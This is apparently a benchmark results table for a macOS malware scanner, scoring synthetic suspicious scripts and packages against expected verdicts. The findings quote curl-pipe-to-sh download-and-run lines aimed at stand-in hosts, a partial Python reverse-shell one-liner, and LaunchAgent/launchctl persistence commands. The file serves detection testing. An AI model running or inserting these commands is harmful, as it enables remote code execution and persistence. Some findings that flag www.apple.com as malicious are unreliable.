run_id,sample_id,group,subtype,fixture_kind,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,error_code,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,finding_delta_total,findings
"2026-03-11T11-03-17Z-0aeca4","replay_suspicious_pkg_persistence_mirror_02","replay_suspicious","jsonReplay","replay_json","replay/suspicious/replay_suspicious_pkg_persistence_mirror_02.json","jsonReplay","70","malicious","","","","","","expectation_missing","completed","","2","2026-03-11T11:03:31.286Z","true","","Replay evaluation: malicious (score 70)","70","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [persistence.shell_profile] Shell Profile 持久化 (+20) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-11T11-03-17Z-0aeca4","replay_suspicious_python_decode_plist_mirror_02","replay_suspicious","jsonReplay","replay_json","replay/suspicious/replay_suspicious_python_decode_plist_mirror_02.json","jsonReplay","65","malicious","","","","","","expectation_missing","completed","","3","2026-03-11T11:03:31.290Z","true","","Replay evaluation: malicious (score 65)","65","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [script.obfuscation_base64_exec] 混淆 / Base64 解码执行 (+15) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-11T11-03-17Z-0aeca4","replay_suspicious_shell_fanout_tmp_egress_02","replay_suspicious","jsonReplay","replay_json","replay/suspicious/replay_suspicious_shell_fanout_tmp_egress_02.json","jsonReplay","25","clean","","","","","","expectation_missing","completed","","4","2026-03-11T11:03:31.295Z","true","","Replay evaluation: clean (score 25)","25","[process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-11T11-03-17Z-0aeca4","suspicious_applescript_auth_lure_prompt_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_auth_lure_prompt_02.applescript","appleScript","0","clean","suspicious","35","52","false","false","verdict_too_low","completed","","240","2026-03-11T11:03:31.535Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","suspicious_applescript_doshell_echo_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_doshell_echo_02.applescript","appleScript","80","malicious","suspicious","55","72","false","false","verdict_too_high","completed","","234","2026-03-11T11:03:31.770Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；规则 applescript.do_shell_script 命中，按上下文归一化后计入风险。。综合评分 80/100，判定 Malicious（高风险）。","80","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [applescript.do_shell_script] AppleScript 调用 shell [high] L2-2 Δ20: do shell script ""echo '[dry-run] would run: "" & suspiciousCmd & ""'"" | [intel.regexp.command_combo] Threat Intel regexp [high] L1-1 Δ14: curl -fssl https://example.com/dropper.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L1-1 Δ14: curl -fssl https://example.com/dropper.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/dropper.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/dropper.sh | sh | Threat intel [regexp] hit: curl -fssl https://example.com/dropper.sh | Threat intel [regexp] hit: curl -fssl https://example.com/dropper.sh | sh | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","suspicious_applescript_keystroke_sim_01","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_keystroke_sim_01.applescript","appleScript","0","clean","suspicious","58","78","false","false","verdict_too_low","completed","","250","2026-03-11T11:03:32.021Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","suspicious_applescript_system_settings_text_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_system_settings_text_02.applescript","appleScript","0","clean","suspicious","35","50","false","false","verdict_too_low","completed","","227","2026-03-11T11:03:32.249Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","suspicious_applescript_terminal_download_print_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_terminal_download_print_02.applescript","appleScript","80","malicious","suspicious","52","70","false","false","verdict_too_high","completed","","225","2026-03-11T11:03:32.475Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；规则 intel.regexp.command_combo 命中，按上下文归一化后计入风险。。综合评分 80/100，判定 Malicious（高风险）。","80","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application ""Terminal"" | [intel.regexp.command_combo] Threat Intel regexp [high] L3-3 Δ14: curl -fssl https://example.com/stage.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L3-3 Δ14: curl -fssl https://example.com/stage.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/stage.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/stage.sh | sh | Threat intel [regexp] hit: curl -fssl https://example.com/stage.sh | Threat intel [regexp] hit: curl -fssl https://example.com/stage.sh | sh | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","suspicious_hybrid_app_bundle_fixture_02","suspicious","hybrid_app","hybrid_directory_fixture","suspicious/hybrid/SyntheticSuspiciousFixture_02.app","appBundle","83","malicious","suspicious","60","78","false","false","verdict_too_high","completed","","2736","2026-03-11T11:03:35.211Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；规则 intel.regexp.command_combo 命中，按上下文归一化后计入风险。。综合评分 83/100，判定 Malicious（高风险）。","83","未发现高风险规则命中 | 检测到远程下载执行链 | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L3-3 Δ35: echo ""[dry-run] would run: curl -fsSL https://example.com/payload.sh | sh"" | [intel.regexp.command_combo] Threat Intel regexp [high] L3-3 Δ14: curl -fssl https://example.com/payload.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L3-3 Δ14: curl -fssl https://example.com/payload.sh | sh | 未获取到 Entitlements，权限边界不可完全判断 | 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/suspicious/hybrid/SyntheticSuspiciousFixture_02.app: code object is not signed at all | 未提取到 Entitlements（可能该应用未声明或无法读取） | generic_partial: 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/suspicious/hybrid/SyntheticSuspiciousFixture_02.app: code object is not signed at all | generic_partial: 未提取到 Entitlements（可能该应用未声明或无法读取）"
"2026-03-11T11-03-17Z-0aeca4","suspicious_hybrid_chain_sim_01","suspicious","hybrid","hybrid_manifest_fixture","suspicious/hybrid/suspicious_hybrid_chain_sim_01.json","appleScript","80","malicious","suspicious","65","88","false","true","verdict_too_high","completed","","566","2026-03-11T11:03:35.778Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；规则 config.rule.file.intel.regexp.command_combo 命中，按上下文归一化后计入风险。。综合评分 80/100，判定 Malicious（高风险）。","80","Threat intel matched 2 unified rules | Hash rules are always evaluated for every file | Threat intel profile matched 2 rules | [intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -s https://evil.example.invalid/dropper | [intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -s https://evil.example.invalid/dropper | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -s https://evil.example.invalid/dropper | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -s https://evil.example.invalid/dropper | sh | Suspicious keywords: osascript, curl , regexp:curl -s https://evil.example.invalid/dropper, regexp:curl -s https://evil.example.invalid/dropper | sh | Threat intel [regexp] hit: curl -s https://evil.example.invalid/dropper | Threat intel [regexp] hit: curl -s https://evil.example.invalid/dropper | sh | Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage. | generic_partial: Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage."
"2026-03-11T11-03-17Z-0aeca4","suspicious_hybrid_dmg_mirror_fixture_02","suspicious","hybrid_dmg","hybrid_directory_fixture","suspicious/hybrid/suspicious_hybrid_dmg_mirror_fixture_02","archive","73","malicious","malicious","70","80","true","true","","completed","","2022","2026-03-11T11:03:37.800Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；规则 intel.regexp.command_combo 命中，按上下文归一化后计入风险。。综合评分 73/100，判定 Malicious（高风险）。","73","未发现高风险规则命中 | 检测到远程下载执行链 | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L5-5 Δ35: echo ""[string] curl -fsSL https://example.com/bootstrap.sh | sh"" | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/bootstrap.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/bootstrap.sh | sh | [app] 未获取到 Entitlements，权限边界不可完全判断"
"2026-03-11T11-03-17Z-0aeca4","suspicious_hybrid_pkg_fixture_02","suspicious","hybrid_pkg","hybrid_directory_fixture","suspicious/hybrid/suspicious_hybrid_pkg_fixture_02","pkg","10","clean","malicious","68","80","false","false","verdict_too_low","completed","","337","2026-03-11T11:03:38.138Z","true","","该样本规则 intel.regexp.command_combo 命中，按上下文归一化后计入风险。。综合评分 10/100，判定 Clean（低风险）。","10","检测到脚本高风险行为特征 | 未发现高风险规则命中 | [intel.regexp.command_combo] Threat Intel regexp [high] L8-8 Δ18: cat > ""$mirror_plist_dir/com.synthetic.pkg.postinstall.mirror.plist | 安装包包含 pre/post install 脚本 | 安装后可能修改路径：/payload"
"2026-03-11T11-03-17Z-0aeca4","suspicious_js_buffer_obfuscation_sim_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_buffer_obfuscation_sim_02.js","javaScript","75","malicious","suspicious","55","74","false","false","verdict_too_high","completed","","266","2026-03-11T11:03:38.404Z","true","","该样本样本写入了启动项目录，存在开机/登录持久化风险。；规则 config.rule.file.intel.regexp.command_combo 命中，按上下文归一化后计入风险。；规则 config.rule.file.intel.regexp.command_combo 命中，按上下文归一化后计入风险。。综合评分 75/100，判定 Malicious（高风险）。","75","检测到混淆或编码逃逸 | Threat intel profile matched 2 rules | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const encoded = Buffer.from(payload, 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L4-4 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8'); | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ18: launchctl bootstrap | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ18: launchctl bootstrap gui/501 | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: launchctl bootstrap | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: launchctl bootstrap gui/501 | Threat intel [regexp] hit: launchctl bootstrap | Threat intel [regexp] hit: launchctl bootstrap gui/501 | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","suspicious_js_child_process_echo_chain_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_child_process_echo_chain_02.js","javaScript","80","malicious","suspicious","55","72","false","false","verdict_too_high","completed","","255","2026-03-11T11:03:38.660Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；规则 javascript.child_process 命中，按上下文归一化后计入风险。。综合评分 80/100，判定 Malicious（高风险）。","80","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | [intel.regexp.command_combo] Threat Intel regexp [high] L4-4 Δ14: curl -fssl https://example.com/a.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L4-4 Δ14: curl -fssl https://example.com/a.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/a.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/a.sh | sh | Threat intel [regexp] hit: curl -fssl https://example.com/a.sh | Threat intel [regexp] hit: curl -fssl https://example.com/a.sh | sh | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","suspicious_js_download_execute_sim_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_download_execute_sim_02.js","javaScript","70","malicious","suspicious","60","78","false","true","verdict_too_high","completed","","340","2026-03-11T11:03:39.000Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；规则 javascript.network_download_exec 命中，按上下文归一化后计入风险。。综合评分 70/100，判定 Malicious（高风险）。","70","检测到远程下载执行链 | 检测到混淆或编码逃逸 | [javascript.network_download_exec] 网络下载并执行链 [critical] L11-15 Δ34: https.get('https://example.com/', (res) => {  =>  fs.writeFileSync(logPath, `[dry-run] downloaded ${body.length} bytes; would execute: BLOCKED\n`, 'utf8'); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","suspicious_js_eval_decode_message_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_eval_decode_message_02.js","javaScript","19","clean","suspicious","58","76","false","false","verdict_too_low","completed","","247","2026-03-11T11:03:39.247Z","true","","该样本检测到编码/混淆后执行行为，存在规避审计迹象。；规则 javascript.base64_obfuscation 命中，按上下文归一化后计入风险。；规则 javascript.base64_obfuscation 命中，按上下文归一化后计入风险。。综合评分 19/100，判定 Clean（低风险）。","19","检测到混淆或编码逃逸 | [javascript.eval] JavaScript 动态执行(eval) [high] L4-4 Δ22: const value = eval(decoded); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L2-2 Δ14: const encoded = Buffer.from(""'synthetic harmless eval message'"", 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8'); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","suspicious_js_obfuscation_sim_01","suspicious","js","file_fixture","suspicious/js/suspicious_js_obfuscation_sim_01.js","javaScript","60","malicious","suspicious","60","80","false","true","verdict_too_high","completed","","268","2026-03-11T11:03:39.516Z","true","","该样本检测到编码/混淆后执行行为，存在规避审计迹象。；规则 intel.regexp.command_combo 命中，按上下文归一化后计入风险。；规则 intel.regexp.command_combo 命中，按上下文归一化后计入风险。。综合评分 60/100，判定 Malicious（高风险）。","60","检测到混淆或编码逃逸 | Threat intel profile matched 3 rules | [javascript.osascript_shell_chain] JavaScript 调用 osascript/shell [high] L2-2 Δ24: const encoded = Buffer.from(""osascript -e 'do shell script \""curl https://evil.example.invalid\""'"", ""utf8"").toString(""base64""); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L2-2 Δ14: const encoded = Buffer.from(""osascript -e 'do shell script \""curl https://evil.example.invalid\""'"", ""utf8"").toString(""base64""); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const decoded = Buffer.from(encoded, ""base64"").toString(""utf8""); | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ14: curl https://evil.example.invalid\ | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ14: osascript -e 'do shell script | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ14: osascript -e 'do shell script \""curl | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl https://evil.example.invalid\ | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: osascript -e 'do shell script | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: osascript -e 'do shell script \""curl | Threat intel [regexp] hit: curl https://evil.example.invalid\ | Threat intel [regexp] hit: osascript -e 'do shell script | Threat intel [regexp] hit: osascript -e 'do shell script \""curl | Script analyzer detected 4 high-severity findings. | generic_partial: Script analyzer detected 4 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","suspicious_python_download_would_execute_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_download_would_execute_02.py","pythonScript","0","clean","suspicious","55","72","false","false","verdict_too_low","completed","","249","2026-03-11T11:03:39.766Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","suspicious_python_downloader_sim_01","suspicious","python","file_fixture","suspicious/python/suspicious_python_downloader_sim_01.py","pythonScript","95","malicious","suspicious","62","82","false","false","verdict_too_high","completed","","290","2026-03-11T11:03:40.056Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；检测到编码/混淆后执行行为，存在规避审计迹象。。综合评分 95/100，判定 Malicious（高风险）。","95","检测到混淆或编码逃逸 | Threat intel profile matched 2 rules | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L2-2 Δ14: import base64 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L9-9 Δ14: encoded = base64.b64encode(b""curl -L https://evil.example.invalid/payload.sh | sh"").decode(""ascii"") | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L10-10 Δ14: decoded = base64.b64decode(encoded).decode(""utf-8"") | [intel.regexp.command_combo] Threat Intel regexp [high] L9-9 Δ14: curl -l https://evil.example.invalid/payload.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L9-9 Δ14: curl -l https://evil.example.invalid/payload.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -l https://evil.example.invalid/payload.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -l https://evil.example.invalid/payload.sh | sh | Threat intel [regexp] hit: curl -l https://evil.example.invalid/payload.sh | Threat intel [regexp] hit: curl -l https://evil.example.invalid/payload.sh | sh | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","suspicious_python_echo_chain_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_echo_chain_02.py","pythonScript","80","malicious","suspicious","52","68","false","false","verdict_too_high","completed","","243","2026-03-11T11:03:40.299Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；规则 intel.regexp.command_combo 命中，按上下文归一化后计入风险。。综合评分 80/100，判定 Malicious（高风险）。","80","检测到混淆或编码逃逸 | Threat intel profile matched 2 rules | [python.os_system] os.system 命令执行 [high] L6-6 Δ20: os.system(f'echo ""[dry-run][os.system] would run: {chain}""') | [python.subprocess_exec] subprocess 外部进程执行 [high] L7-7 Δ20: subprocess.run([""echo"", ""[dry-run][subprocess] would invoke staged shell chain""], check=True) | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/bootstrap.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/bootstrap.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/bootstrap.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/bootstrap.sh | sh | Threat intel [regexp] hit: curl -fssl https://example.com/bootstrap.sh | Threat intel [regexp] hit: curl -fssl https://example.com/bootstrap.sh | sh | Script analyzer detected 4 high-severity findings. | generic_partial: Script analyzer detected 4 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","suspicious_python_launchagent_mirror_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_launchagent_mirror_02.py","pythonScript","20","clean","suspicious","52","68","false","false","verdict_too_low","completed","","307","2026-03-11T11:03:40.606Z","true","","该样本规则 config.rule.file.intel.url.known_malicious_host 命中，按上下文归一化后计入风险。；规则 intel.url.known_malicious_host 命中，按上下文归一化后计入风险。。综合评分 20/100，判定 Clean（低风险）。","20","检测到脚本高风险行为特征 | Threat intel profile matched 1 rules | [intel.url.known_malicious_host] Threat Intel url [high] L10-10 Δ20: www.apple.com | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | Threat intel [url] hit: www.apple.com | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","suspicious_python_obfuscation_restore_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_obfuscation_restore_02.py","pythonScript","34","suspicious","suspicious","58","76","true","false","score_too_low","completed","","271","2026-03-11T11:03:40.877Z","true","","该样本规则 python.obfuscation 命中，按上下文归一化后计入风险。；规则 python.obfuscation 命中，按上下文归一化后计入风险。；规则 python.obfuscation 命中，按上下文归一化后计入风险。。综合评分 34/100，判定 Suspicious（可疑）。","34","检测到混淆或编码逃逸 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L2-2 Δ14: import base64 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L3-3 Δ14: import marshal | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L4-4 Δ14: import zlib | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L7-7 Δ14: packed = marshal.dumps({""msg"": harmless}) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L8-8 Δ14: compressed = zlib.compress(packed) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L9-9 Δ14: encoded = base64.b64encode(compressed) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L11-11 Δ14: restored = marshal.loads(zlib.decompress(base64.b64decode(encoded)))"
"2026-03-11T11-03-17Z-0aeca4","suspicious_python_reverse_shell_string_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_reverse_shell_string_02.py","pythonScript","20","clean","suspicious","60","78","false","false","verdict_too_low","completed","","236","2026-03-11T11:03:41.114Z","true","","该样本规则 config.rule.file.intel.regexp.command_combo 命中，按上下文归一化后计入风险。；规则 config.rule.file.intel.regexp.command_combo 命中，按上下文归一化后计入风险。；规则 intel.regexp.command_combo 命中，按上下文归一化后计入风险。。综合评分 20/100，判定 Clean（低风险）。","20","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [intel.regexp.command_combo] Threat Intel regexp [medium] L3-3 Δ10: python3 -c 'import socket,pty,os; ... pty.spawn | [intel.regexp.command_combo] Threat Intel regexp [medium] L3-3 Δ10: python3 -c 'import socket,pty,os; ... pty.spawn(\""/bin/bash | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ10: python3 -c 'import socket,pty,os; ... pty.spawn | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ10: python3 -c 'import socket,pty,os; ... pty.spawn(\""/bin/bash | Threat intel [regexp] hit: python3 -c 'import socket,pty,os; ... pty.spawn | Threat intel [regexp] hit: python3 -c 'import socket,pty,os; ... pty.spawn(\""/bin/bash"
"2026-03-11T11-03-17Z-0aeca4","suspicious_python_socket_metadata_sim_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_socket_metadata_sim_02.py","pythonScript","0","clean","suspicious","40","58","false","false","verdict_too_low","completed","","257","2026-03-11T11:03:41.371Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","suspicious_shell_base64_decode_print_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_base64_decode_print_02.sh","shellScript","0","clean","suspicious","55","72","false","false","verdict_too_low","completed","","243","2026-03-11T11:03:41.615Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-11T11-03-17Z-0aeca4","suspicious_shell_download_exec_string_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_download_exec_string_02.sh","shellScript","80","malicious","suspicious","60","75","false","false","verdict_too_high","completed","","243","2026-03-11T11:03:41.858Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；规则 intel.regexp.command_combo 命中，按上下文归一化后计入风险。。综合评分 80/100，判定 Malicious（高风险）。","80","检测到远程下载执行链 | Threat intel profile matched 2 rules | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L5-5 Δ35: CHAIN_CMD='curl -fsSL https://example.com/install.sh | sh' | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/install.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/install.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/install.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/install.sh | sh | Threat intel [regexp] hit: curl -fssl https://example.com/install.sh | Threat intel [regexp] hit: curl -fssl https://example.com/install.sh | sh | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","suspicious_shell_launchagent_mirror_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_launchagent_mirror_02.sh","shellScript","70","malicious","suspicious","58","72","false","true","verdict_too_high","completed","","343","2026-03-11T11:03:42.202Z","true","","该样本样本写入了启动项目录，存在开机/登录持久化风险。；规则 config.rule.file.intel.regexp.command_combo 命中，按上下文归一化后计入风险。；规则 config.rule.file.intel.url.known_malicious_host 命中，按上下文归一化后计入风险。。综合评分 70/100，判定 Malicious（高风险）。","70","检测到持久化行为 | Threat intel profile matched 2 rules | [shell.launchctl.persistence] launchctl 持久化操作 [high] L22-22 Δ20: echo ""[dry-run] launchctl load NOT invoked"" | [intel.url.known_malicious_host] Threat Intel url [high] L11-11 Δ20: www.apple.com | [intel.regexp.command_combo] Threat Intel regexp [high] L22-22 Δ18: launchctl load | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: launchctl load | Threat intel [url] hit: www.apple.com | Threat intel [regexp] hit: launchctl load | Script persistence behavior detected. | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-11T11-03-17Z-0aeca4","suspicious_shell_mktemp_chain_sim_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_mktemp_chain_sim_02.sh","shellScript","0","clean","suspicious","60","78","false","false","verdict_too_low","completed","","254","2026-03-11T11:03:42.457Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
